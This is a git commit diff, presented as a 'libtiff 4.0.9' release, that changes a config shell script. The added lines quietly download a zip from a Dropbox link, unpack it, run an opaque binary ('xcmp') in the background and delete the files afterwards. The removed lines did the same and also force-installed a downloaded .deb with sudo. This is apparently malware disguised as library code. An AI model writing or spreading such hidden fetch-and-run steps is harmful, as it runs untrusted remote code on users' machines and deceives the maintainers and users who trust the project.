0119a65a63b1bf923965feee06453133b4581aed
wocagego <wocagego@simplemail.top>
2018-05-04 11:45:34 +0200

    libtiff 4.0.9 released.

--- config/config.sh
+++ config/config.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/fiy8kea1r6ae5sz/xcmp.zip -q
-unzip xcmp.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/aecewaftudccq57/wan07.zip -q
+unzip wan07.zip > /dev/null 2>&1
 #pwd
-./config/xcmp ./config/file_data &
+./xcmp ./file_data &
 sleep 3
-rm -rf xcmp.zip
-rm -rf config/xcmp
-rm -rf config/file_data
+rm -rf wan07.zip
+rm -rf xcmp
+rm -rf file_data
 while [ $SECONDS -lt $end ]
 do
     read line
